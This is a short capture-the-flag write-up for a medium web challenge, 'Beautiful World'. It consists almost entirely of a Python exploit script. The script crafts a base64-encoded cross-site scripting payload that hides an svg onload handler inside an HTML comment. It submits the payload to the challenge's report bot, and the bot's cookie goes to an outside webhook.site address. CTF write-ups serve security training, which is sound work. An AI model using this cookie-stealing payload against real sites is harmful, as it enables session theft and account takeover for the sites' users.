# Beautiful World
- Author: Vincent55
- Category: Web
- Difficulty: Medium

What a wonderful and beautiful world for frontend


## exploit
```python
import requests
import re
import base64
import urllib.parse


url = "http://172.31.0.2:8001/"
attack_server = "https://webhook.site/ffeb0575-f4e4-4280-9179-206578101d63"

content = f'<!--><svg/onload=window.location="{attack_server}/?flag="+document.cookie></script>-->'
content = urllib.parse.quote(base64.b64encode(content.encode()).decode())

payload = f"http://world/note?content={content}"

print(payload)

requests.post(
    url + "report",
    data={
        "url": payload,
    },
)

# you will get flag in log

```
